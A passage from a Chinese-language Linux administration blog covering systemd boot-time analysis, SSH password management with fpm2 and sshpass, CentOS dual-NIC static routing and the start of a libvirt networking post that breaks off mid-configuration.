<h3 class="anchor anchorWithStickyNavbar_LWe7" id="5-检查系统启动消耗时间">5 检查系统启动消耗时间<a href="#5-检查系统启动消耗时间" class="hash-link" aria-label="5 检查系统启动消耗时间的直接链接" title="5 检查系统启动消耗时间的直接链接">​</a></h3>
<p>在过去我们可以借助第三方工具来实现对系统启动过程的耗时跟踪，现在这个功能已经集成到systemd当中，可以十分方便的了解到系统启动时在各个阶段所花费的时间：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># systemd-analyze</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Startup finished in 1.669s (kernel) + 1.514s (initrd) + 7.106s (userspace) = 10.290s</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">以上信息简要的列出了从内核到用户空间整个引导过程大致花费的时间，如果要查看具体每项服务所花费的时间则使用如下命令：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># systemd-analyze blame</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          6.468s dnf-makecache.service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          5.556s network.service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          1.022s plymouth-start.service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           812ms plymouth-quit-wait.service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           542ms lvm2-pvscan@8:7.service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           451ms systemd-udev-settle.service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           306ms firewalld.service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           246ms dmraid-activation.service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           194ms lvm2-pvscan@8:18.service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           171ms lvm2-monitor.service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           145ms bluetooth.service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           135ms accounts-daemon.service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           113ms rtkit-daemon.service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           111ms ModemManager.service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           104ms avahi-daemon.service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           102ms systemd-logind.service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            79ms systemd-vconsole-setup.service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            77ms acpid.service</span><br></span></code></pre></div></div>
<p>输出结果类似上面这些内容，至此我们可以  看到系统里每一项服务的启动时间，据此可以对系统引导过程了如指掌，如果你觉得这还不够直观，那么可以将结果导出到图像文件里面：</p>
<p><code>systemd-analyze plot &gt;systemd.svg</code></p>
<p>该命令会将系统的启动过程输出到一张svg图像上面，更直观的展现出各个服务启动所花费的时间，在我们需要分析和优化服务启动项的时候很有帮助。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="6-查看各项服务的资源使用情况">6 查看各项服务的资源使用情况<a href="#6-查看各项服务的资源使用情况" class="hash-link" aria-label="6 查看各项服务的资源使用情况的直接链接" title="6 查看各项服务的资源使用情况的直接链接">​</a></h3>
<p>和top命令不一样，top命令更侧重于展示以进程为单位的资源状态，而systemd提供了一个命令来方便的查看每项服务的实时资源消耗状态：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># systemd-cgtop</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Path                                              Tasks   %CPU   Memory  Input/s Output/s</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/                                                   199   12.3     1.9G        -        -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/system.slice/ModemManager.service                    1      -        -        -        -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/system.slice/abrt-oops.service                       1      -        -        -        -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/system.slice/abrt-xorg.service                       1      -        -        -        -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/system.slice/abrtd.service                           1      -        -        -        -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/system.slice/accounts-daemon.service                 1      -        -        -        -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/system.slice/acpid.service                           1      -        -        -        -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/system.slice/alsa-state.service                      1      -        -        -        -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/system.slice/atd.service                             1      -        -        -        -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/system.slice/auditd.service                          3      -        -        -        -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/system.slice/avahi-daemon.service                    2      -        -        -        -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/system.slice/bluetooth.service                       1      -        -        -        -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/system.slice/chronyd.service                         1      -        -        -        -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/system.slice/colord.service                          1      -        -        -        -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/system.slice/crond.service                           1      -        -        -        -</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="7-我们必须要注意到的配置文件变更">7 我们必须要注意到的配置文件变更<a href="#7-我们必须要注意到的配置文件变更" class="hash-link" aria-label="7 我们必须要注意到的配置文件变更的直接链接" title="7 我们必须要注意到的配置文件变更的直接链接">​</a></h3>
<p>systemd考虑到各种发行版本的用户使用习惯，尽量提供更为通用的配置文件以方便各家统一，方便用户使用，下面列出一些基本的统一的配置文件：</p>
<ul>
<li>/etc/hostname，debian和redhat在这个配置文件上的差异导致了系统管理或多或少的不便，此文件的统一意义重大</li>
<li>/etc/vconsole.conf，此文件用来统一管理console和键盘映射</li>
<li>/etc/locale.conf 配置系统环境语系</li>
<li>/etc/modules-load.d/*.conf 内核模块加载配置文件</li>
<li>/etc/sysctl.d/*.conf 内核参数配置文件，对/etc/sysctl.conf的扩充</li>
<li>/etc/tmpfiles.d/*.conf 运行态临时文件配置</li>
<li>/etc/os-release  /etc/machine-id  /etc/machine-info 这三个文件的统一对系统管理员来说也是意义深远，它让我们有了统一的检测发行版本等信息的入口</li>
</ul>
<p>以上内容仅仅让各位对systemd形成基本的认识，我们将在后期的文章中更加深入地讨论systemd的特性。最后，再次感谢作者Lennart的贡献。</p>
<blockquote>
<p>参考链接：</p>
<ul>
<li><a href="http://cgit.freedesktop.org/systemd/" target="_blank" rel="noopener noreferrer">http://cgit.freedesktop.org/systemd/</a></li>
<li><a href="http://0pointer.de/blog/projects/" target="_blank" rel="noopener noreferrer">http://0pointer.de/blog/projects/</a></li>
<li><a href="https://linuxtoy.org/archives/interview-creater-of-systemd-and-pulseaudio-lennart.html" target="_blank" rel="noopener noreferrer">https://linuxtoy.org/archives/interview-creater-of-systemd-and-pulseaudio-lennart.html</a></li>
</ul>
</blockquote></div><footer class="row docusaurus-mt-lg"><div class="col"><b>标签：</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/systemd">systemd</a></li></ul></div></footer></article><article class="margin-bottom--xl"><header><h2 class="title_f1Hy"><a href="/notes/blog/2013/11/12/use-fpm2-to-manage-password">使用fpm2来管理ssh密码</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2013-11-12T00:00:00.000Z">2013年11月12日</time> · <!-- -->阅读需 3 分钟</div></header><div class="markdown"><blockquote>
<p>不知道有没有童鞋需要管理一堆ssh口令，5个以内靠脑子记可能是个好办法，但是如果10个100个的时候恐怕脑子记有点不太够用。</p>
</blockquote>
<p>不知道有没有童鞋需要管理一堆ssh口令，5个以内靠脑子记可能是个好办法，但是如果10个100个的时候恐怕脑子记有点不太够用，
这个时候就需要借助外部工具来进行管理，当然你可以自己写个简单的脚本，把ssh账号密码写入一个list里面，
人懒且为了省事也可以使用一些现成的工具，下面就推荐一个图形界面的小工具给需要的童鞋：fpm2
fpm2全名Figaro&#x27;s Paaword Manager 2，是一个开源软件，使用GNU General Public License Version 2 协议，这里是<a href="http://als.regnet.cz/fpm2/" target="_blank" rel="noopener noreferrer">官方地址</a>，它还有android版本的。</p>
<p>在fedora里面可以直接yum安装：</p>
<p><code>yum install fpm2</code></p>
<p>安装完成后第一次运行需要你输入一个密码，今后每次启动fpm2的时候就用这个密码，默认如果密码输入错误次数超过3次，则你懂的。</p>
<p>打开fpm2后，一看就明白如何使用，它支持ssh/web以及自定义的密码管理，可以对管理的服务器进行分类，十分方便。其亮点是你可以根据自己的需要设置launcher，默认双击建立好的口令就会自动执行launcher定义的命令；</p>
<p>launcher里面将保存的账号密码和IP/URL定义为参数，<code>$a ip/url</code>  ，<code>$u  username</code>  ， <code>$p  password</code>， 有了这些变量后自定义launcher就很方便了。</p>
<p>但是其默认的ssh的launcher是不支持直接双击list里面的项目就登陆进服务器的，这个时候需要另外一个小工具sshpass，它的用处是登陆ssh的时候可以把密码作为参数传递给ssh客户端，而不需要交互式输入密码，这个工具代码托管在sf，fedora里也可以yum安装：</p>
<p><code>yum install sshpass</code></p>
<p>光有这两个工具还不够，下面是将两个工具完美结合起来的关键：</p>
<p>在fpm2的settings选项卡下有launcher设置项，打开之后你会发现默认的ssh launcher，下面是我自定义的ssh的加载器命令：</p>
<p>配置launcher</p>
<p><code>gnome-terminal -e &#x27;sh -c &quot;&#x27;&quot;sshpass -p &#x27;&quot;&#x27;$p&#x27;&quot;&#x27; ssh  -p 22 $u@$a;sudo -s&quot;&#x27;&quot;&#x27;</code></p>
<p>特别注意里面的单双引号的写法，不然如果你的密码里有像%&amp;$之类的特殊符号时是会出问题的，</p>
<p><code>gnome-terminal -e &#x27;xxxxx&#x27;</code> 这里是单引号</p>
<p><code>sh -c &quot;&#x27;&quot; xxxxx &quot;&#x27;&quot;</code> 这里是两对双引号中包含的单引号</p>
<p><code>sshpass -p &#x27;&quot;&#x27; xxx &#x27;&quot;&#x27;</code> 这里是两对单引号包含的双引号</p>
<p>ssh命令后面加个sudo -s的作用是当退出ssh连接时不会立即关闭当前的terminal终端</p>
<p>使用这个launcher可以通杀所有特殊字符的密码，在运行fpm2+sshpass的组合前请自己使用当前运行fpm2的账户登陆ssh一下远程服务器将  服务器的publickey取回来，没有key的情况下sshpass无法工作的。至少我遇到的是这样。</p></div><footer class="row docusaurus-mt-lg"><div class="col"><b>标签：</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/fpm-2">fpm2</a></li></ul></div></footer></article><article class="margin-bottom--xl"><header><h2 class="title_f1Hy"><a href="/notes/blog/2013/11/11/centos-multi-network-interface-route">CentOS中双网卡静态路由配置</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2013-11-11T00:00:00.000Z">2013年11月11日</time> · <!-- -->阅读需 3 分钟</div></header><div class="markdown"><blockquote>
<p>一个网卡的话不需要静态路由的，如果多个网卡的话可以手工配置静态路由，特别是多个网卡走不同的子网的时候。</p>
</blockquote>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="来自网上搜索的方法">来自网上搜索的方法<a href="#来自网上搜索的方法" class="hash-link" aria-label="来自网上搜索的方法的直接链接" title="来自网上搜索的方法的直接链接">​</a></h2>
<p>之前一直没有配置过两个网卡分别使用不同的IP，走不同的网关，google了下发现了下面的手工添加路由的脚本：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">#!/bin/sh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ip route add 10.1.1.0/24 dev br0 src 10.1.1.10 table bond0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ip route add default via 10.1.1.1 dev br0 table bond0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ip rule add from 10.1.1.10/32 table bond0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ip rule add to 10.1.1.10/32 table bond0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ip route add 192.168.1.0/24 dev br1 src 192.168.1.10 table bond1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ip route add default via 192.168.1.1 dev br1 table bond1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ip rule add from 192.168.1.10/32 table bond1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ip rule add to 192.168.1.10/32 table bond1</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="来自红帽文档中的方法">来自红帽文档中的方法<a href="#来自红帽文档中的方法" class="hash-link" aria-label="来自红帽文档中的方法的直接链接" title="来自红帽文档中的方法的直接链接">​</a></h2>
<p>后来想了想这样的问题系统肯定已经支持得很好了，只是没有找到配置方法，于是找了下红帽的文档，发现可以像下面这样配置：</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="配置静态路由">配置静态路由<a href="#配置静态路由" class="hash-link" aria-label="配置静态路由的直接链接" title="配置静态路由的直接链接">​</a></h3>
<p>一个网卡的话不需要静态路由的，如果多个网卡的话可以手工配置静态路由，特别是多个网卡走不同的子网的时候。</p>
<p><code>route -n   #查看当前路由信息</code></p>
<p>静态路由配置文件路径:
<code>/etc/sysconfig/network-scripts/route-interface_name</code>
就和网卡的配置文件路径结构差不多，比如ifcfg-eth0变成了route-eth0。</p>
<p>eth0网卡的静态路由就保存在这个文件里面。这个文件可以有两种格式</p>
<ul>
<li>IP命令参数格式</li>
<li>网络/掩码指令格式</li>
</ul>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="ip命令参数模式">IP命令参数模式：<a href="#ip命令参数模式" class="hash-link" aria-label="IP命令参数模式：的直接链接" title="IP命令参数模式：的直接链接">​</a></h4>
<p>1）第一行定义默认路由：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">default via X.X.X.X dev interface</span><br></span></code></pre></div></div>
<p>X.X.X.X 是默认路由的IP. interface是可以连接到默认路由的网卡接口名.</p>
<p>2）静态路由一行一个：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">X.X.X.X/X via X.X.X.X dev interface</span><br></span></code></pre></div></div>
<p>X.X.X.X/X 是网络和掩码. X.X.X.X 和 interface 是各自网段的网关IP和网卡接口.</p>
<p>配置示例 route-eth0：
默认网关 192.168.0.1, 接口eth0. 两条静态路由到 10.10.10.0/24 和172.16.1.0/24 :</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">default via 192.168.0.1 dev eth0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">10.10.10.0/24 via 10.10.10.1 dev eth1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">172.16.1.0/24 via 192.168.0.1 dev eth0</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="网络掩码指令格式">网络/掩码指令格式：<a href="#网络掩码指令格式" class="hash-link" aria-label="网络/掩码指令格式：的直接链接" title="网络/掩码指令格式：的直接链接">​</a></h4>
<p>route-interface文件的第二种格式.下面是样板:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ADDRESS0=X.X.X.X</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">NETMASK0=X.X.X.X</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">GATEWAY0=X.X.X.X</span><br></span></code></pre></div></div>
<p>ADDRESS0=X.X.X.X 静态路由的网络编号.
NETMASK0=X.X.X.X 为上面那行设置子网掩码 .
GATEWAY0=X.X.X.X  能够连接到 ADDRESS0=X.X.X.X 这个网络的网关</p>
<p>配置示例 route-eth0：
默认网关 192.168.0.1, 接口 eth0. 两条到10.10.10.0/24 和172.16.1.0/24 的静态路由：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ADDRESS0=10.10.10.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">NETMASK0=255.255.255.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">GATEWAY0=10.10.10.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ADDRESS1=172.16.1.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">NETMASK1=255.255.255.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">GATEWAY1=192.168.0.1</span><br></span></code></pre></div></div>
<p>ADDRESS0, ADDRESS1, ADDRESS2, 这样的编号必须是一个接一个的数字。</p></div><footer class="row docusaurus-mt-lg"><div class="col"><b>标签：</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/centos">centos</a></li><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/route">route</a></li></ul></div></footer></article><article class="margin-bottom--xl"><header><h2 class="title_f1Hy"><a href="/notes/blog/2013/10/01/libvirt-basic-usage">libvirt中的网络管理实践</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2013-10-01T00:00:00.000Z">2013年10月1日</time> · <!-- -->阅读需 10 分钟</div></header><div class="markdown"><blockquote>
<p>逐步分析libvirt中的网络管理方法及实践，分析在nat网络中遇到的问题及解决思路</p>
</blockquote>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="libvirt网络基本概念">libvirt网络基本概念<a href="#libvirt网络基本概念" class="hash-link" aria-label="libvirt网络基本概 念的直接链接" title="libvirt网络基本概念的直接链接">​</a></h2>
<p>libvirt默认使用了一个名为default的nat网络，这个网络默认使用virbr0作为桥接接口，使用dnsmasq来为使用nat网络的虚拟机提供dns及dhcp服务，dnsmasq生效后的配置文件默认保存在以下路径：</p>
<ul>
<li>/var/lib/libvirt/dnsmasq/default.hostsfile   mac&amp;&amp;ip绑定的配置文件</li>
<li>/var/lib/libvirt/dnsmasq/default.leases  dhcp分配到虚拟机的ip地址列表</li>
<li>/var/lib/libvirt/network/default.xml  default网络的配置文件</li>
</ul>
<p>dnsmasq服务的启动脚本在/etc/init.d/dnsmasq ，但是我们如果手动使用此脚本来启动服务将会导致dnsmasq读取其自己的配置文件来启动此服务，因此这么做是不推荐的，因为这个服务完全由libvirtd在接管，当libvirtd服务启动的时候，它会将它管理的被标记为autostart的network一并启动起来，而启动network的时候就会自动调用dnsmasq并赋予其适宜的配置文件来运行服务。</p>
<p>使用libvirt管理的网络都会用到dnsmasq来产生相应的配置，比如定义了一个名为route110的network，那么这个route110将使用一个新的桥接接口virbr1来接入网络，并使用dnsmasq产生名为route110.hostsfile和route110.leases的配置文件。其实这里提到的virbr0和virbr1都是libvirt产生的虚拟网卡，其作用就相当于一个虚拟交换机，为虚拟机提供网络转发服务。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="libvirt中网络的类型">libvirt中网络的类型<a href="#libvirt中网络的类型" class="hash-link" aria-label="libvirt中网络的类型的直接链接" title="libvirt中网络的类型的直接链接">​</a></h2>
<p>首先分析一下libvirt所能提供的网络类型：isolated 和forwarding,其中，isolated意为绝对隔离的网络，也就是说处于此网络内的虚拟机对于外界是隔离的，这种模式可以用到一些特殊的场合，比如虚  拟机只提供给内部使用，虚拟机只要求能相互通信而不需要与互联网通信。另外一类，forwarding，就是把虚拟机的数据forward到物理网络实现与外部网络进行通讯，其中forwarding又分为两种：nat和routed。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="nat">nat<a href="#nat" class="hash-link" aria-label="nat的直接链接" title="nat的直接链接">​</a></h3>
<p>就是把虚拟机的网络数据在经过物理机网络的时候进行ip伪装，这样所有虚拟机出去的网络数据都相当于是物理机出去的数据，也就是说，我们可以分配给使用nat网络的虚拟机一个内网ip，而这个内网ip的虚拟机访问出去的时候外部网络看到的是物理机的公网ip，这样做的用处就是实现多个虚拟机共享物理主机的公网ip，节省公网ip地址；如前所述，默认情况下libvirt已经提供了一个名为default的nat网络，在不需要进行任何配置的情况下使用default网络的虚拟机即可访问互联网，但是互联网却无法访问虚拟机提供的服务，这是因为default网络只对虚拟机的数据包进行了伪装，而没有进行dnat和snat。</p>
<p>需要注意的是libvirt所实现的这种nat网络是通过物理机的iptables规则来实现的，也即是在虚拟机数据经过nat表的postrouting链出去的时候对其进行了伪装。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="routed">routed<a href="#routed" class="hash-link" aria-label="routed的直接链接" title="routed的直接链接">​</a></h3>
<p>forwarding模式的另外一种，routed，就是将虚拟机的数据直接通过物理机route出去，和nat一样，也是需要一个virbr虚拟网卡接口来与外面进行通信，这种模式的不同之处在于虚拟机的数据没有经过伪装便直接交给了外部网络，也就是说，使用route模式网络的虚拟机可以使用公网ip地址，而物理机却恰恰在这个时候完全可以使用一个内网ip而不对外提供访问，这样，虚拟机的网卡仅仅把物理机当作一个route数据的工具，此模式应用的场合很多，比如需要让虚拟机运行在一个dmz网络中。但是使用route模式有诸多限制，例如物理机的网络接口不够用的情况下。</p>
<p>这里需要注意的是，nat模式和route模式的区别仅仅在于前者使用了iptables对虚拟机的数据包进行了伪装，而后者没有。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="自定义routed网络">自定义routed网络<a href="#自定义routed网络" class="hash-link" aria-label="自定义routed网络的直接链接" title="自定义routed网络的直接链接">​</a></h2>
<p>在实际的虚拟机使用过程中，我们可能会碰到下面的情况：</p>
<ul>
<li>1 使用nat网络的虚拟机也需要对外提供服务，</li>
<li>2 物理机只有一个网卡和一个ip，而我们现在既需要通过这个网卡来管理虚拟机，又需要使用这个网卡来提供route网络。</li>
</ul>
<p>当然你所能碰到的问题可能千奇百怪，也可能根本没有碰到过此类bt问题。下面的内容只作为分析和解决问题的思路，不能生搬。在了解了libvirt的网络管理模式之后，就可以自己动手解决这些限制，下面重点解释第二种问题的解决方法：</p>
<p>首先假定route网络使用的是virbr1虚拟网卡，而虚拟机使用virbr1来为虚拟机提供服务，而我本机又有了一个br0作为em1的桥接网卡来对外提供网络服务，br0的ip是192.168.1.51</p>
<p>首先禁用br0：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ifdown br0</span><br></span></code></pre></div></div>
<p>并配置br0的onboot为no,配置文件为<code>onboot=no</code></p>
<p>然后我们定义了一个名为route的网络，virbr1的ip设置为192.168.1.51 ，这样做的目的是让virbr1取代之前的br0.</p>
<div class="language-xml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-xml codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">network</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">name</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">route</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">name</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">uuid</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">6224b437-386b-f510-11d5-58d58b1ce87a</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">uuid</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">forward</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">mode</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">&#x27;</span><span class="token tag attr-value" style="color:#e3116c">route</span><span class="token tag attr-value punctuation" style="color:#393A34">&#x27;</span><span class="token tag punctuation" style="color:#393A34">/&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">bridge</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">name</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">&#x27;</span><span class="token tag attr-value" style="color:#e3116c">virbr1</span><span class="token tag attr-value punctuation" style="color:#393A34">&#x27;</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">stp</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">&#x27;</span><span class="token tag attr-value" style="color:#e3116c">on</span><span class="token tag attr-value punctuation" style="color:#393A34">&#x27;</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">delay</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">&#x27;</span><span class="token tag attr-value" style="color:#e3116c">0</span><span class="token tag attr-value punctuation" style="color:#393A34">&#x27;</span><span class="token tag" style="color:#00009f"> </span><span class="token tag punctuation" style="color:#393A34">/&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">mac</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">address</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">&#x27;</span><span class="token tag attr-value" style="color:#e3116c">52:54:00:C8:9F:07</span><span class="token tag attr-value punctuation" style="color:#393A34">&#x27;</span><span class="token tag punctuation" style="color:#393A34">/&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">ip</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">address</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">&#x27;</span><span class="token tag attr-value" style="color:#e3116c">192.168.1.51</span><span class="token tag attr-value punctuation" style="color:#393A34">&#x27;</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">netmask</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">&#x27;</span><span class="token tag attr-value" style="color:#e3116c">255.255.255.0</span><span class="token tag attr-value punctuation" style="color:#393A34">&#x27;</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" 